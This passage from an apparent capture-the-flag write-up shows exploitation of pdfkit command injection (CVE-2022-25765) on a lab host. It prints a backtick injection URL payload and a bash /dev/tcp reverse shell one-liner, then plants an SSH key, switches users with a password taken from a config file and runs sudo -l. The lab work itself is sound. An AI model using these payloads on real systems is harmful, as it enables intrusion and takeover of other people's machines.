    We can see that it’s using pdfkit v0.8.6 that it’s vulnerable to Command Injection ( CVE-2022-25765 )
    With that in mind we can try to craft our own webserver that exploits this vulnerability.

    http://IP:PORT/?name=#{'%20`sleep 5`'}

    Using this payload we can see that it’s sleeping for 5 secs before trying to download the pdf file.
    Trying a bash reverse shell successfully gives us a tty shell:

    bash -c 'exec sh -i >& /dev/tcp/10.10.15.3/443 0>&1'

    Now that we have user access and the port 22 for SSH is present, we could try to get a better reverse shell by copying our id_rsa.pub file into the ruby‘s .ssh folder.

    With this password we can change our user to henry by using:

    su - henry # and provide the password we extracted from the config file

    Now that we know the password of the user henry we can use the command sudo -l to find out what henry can run:

    henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
